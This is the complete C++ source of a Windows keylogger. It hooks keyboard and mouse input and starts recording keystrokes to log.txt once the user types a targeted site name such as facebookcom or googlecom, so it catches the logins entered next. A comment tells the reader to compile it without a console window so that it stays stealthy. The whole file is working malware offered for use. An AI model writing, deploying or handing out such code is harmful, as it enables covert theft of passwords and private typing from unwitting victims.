#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>

using namespace std;

// Put this to false to make the keylogger run without waiting for target
const bool WAIT_FOR_TARGET = true;

// Add any input, domain or character that should trigger the keylogger to this array
// keylogger only saves letters, numbers, mouse clicks, Enter and Backspace to the log file
const string TARGETED_INPUTS[] = {
    "facebookcom",
    "googlecom",
    "twittercom"};

string currentString;
bool logging = false;

HHOOK hook;
KBDLLHOOKSTRUCT kbdStruct; // Used to store key presses

// Writes the keystrokes to a log file
void writeToLog(string);

// Gets called when key is pressed
LRESULT __stdcall hookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Checks if the key pressed was a valid key
    if (nCode >= 0)
    {
        // Checks if the key pressed was a keydown (keyboard key)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Stores the key pressed into a local variable
            kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);

            // Checks if the shift key was pressed (for capitalization)
            if (GetKeyState(VK_SHIFT) & 0x8000)
            {
                // Checks if the key pressed was a letter
                if (kbdStruct.vkCode >= 'A' && kbdStruct.vkCode <= 'Z')
                {
                    // Calls the writeToLog function with the uppercase version of the letter pressed
                    writeToLog(string(1, toupper(kbdStruct.vkCode)));
                }
            }
            else
            {
                // Checks if the key pressed was a number
                if (kbdStruct.vkCode >= '0' && kbdStruct.vkCode <= '9')
                {
                    // Calls the writeToLog function with the number pressed
                    writeToLog(string(1, kbdStruct.vkCode));
                }

                // Checks if the key pressed was a letter
                else if (kbdStruct.vkCode >= 'A' && kbdStruct.vkCode <= 'Z')
                {
                    // Calls the writeToLog function with the lowercase version of the letter pressed
                    writeToLog(string(1, tolower(kbdStruct.vkCode)));
                }

                // Checks if the key pressed was a space
                else if (kbdStruct.vkCode == VK_SPACE)
                {
                    // Calls the writeToLog function with a space
                    writeToLog(" ");
                }

                // Checks if the key pressed was the enter key
                else if (kbdStruct.vkCode == VK_RETURN)
                {
                    writeToLog("<ENTER>");
                }

                // Checks if the key pressed was the backspace key
                else if (kbdStruct.vkCode == VK_BACK)
                {
                    writeToLog("<BACKSPACE>");
                }

                // Checks if the key pressed was a number on the numpad
                else if (kbdStruct.vkCode >= VK_NUMPAD0 && kbdStruct.vkCode <= VK_NUMPAD9)
                {
                    // Calls the writeToLog function with the number pressed on the numpad
                    writeToLog(string(1, kbdStruct.vkCode - VK_NUMPAD0 + '0'));
                }
            }

        } // Checks if the key pressed was a mouse button
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN)
        {
            writeToLog("<MOUSE_CLICK>");
        }
    }
    // Calls the next hook in the chain
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

// writes key strokes to a string
// resets the string if user pressed SPACE or ENTER
// if the string includes one of the targeted inputs
// the function will start writing to a log file
void writeToLog(string s)
{
    if (!WAIT_FOR_TARGET)
    {
        ofstream log;
        log.open("log.txt", fstream::app);
        log << s;
        log.close();
    }
    else
    {
        bool targetFound = false;

        // Write input to the log file if logging is ON
        if (logging)
        {
            ofstream log;
            log.open("log.txt", fstream::app);
            log << s;
            log.close();
        } // Else wait until the user types one of the targeted inputs
        else
        {
            // Reset the string if user pressed SPACE or ENTER
            if (s == " " || s == "<ENTER>")
            {
                currentString = "";
            }
            else
            {
                currentString += s;

                // Check if the user has typed one of the targeted inputs
                for (int i = 0; i < sizeof(TARGETED_INPUTS) / sizeof(string); i++)
                {
                    if (currentString.find(TARGETED_INPUTS[i]) != string::npos)
                    {
                        targetFound = true;
                        break;
                    }
                }

                // Start logging when the targeted input is found
                if (targetFound)
                {
                    logging = true;
                }
            }
        }
    }
}

// To prevent a command line window from opening and making the keylogger stealthy
// Compile with the -mwindows flag with gcc (g++) or the quivalent in visual studio
int main()
{
    // Sets the hook to the keyboard and mouse
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookProc, NULL, 0);
    SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookProc, NULL, 0);

    // Loop that runs on background
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Removes the hook
    UnhookWindowsHookEx(hook);
    return 0;
}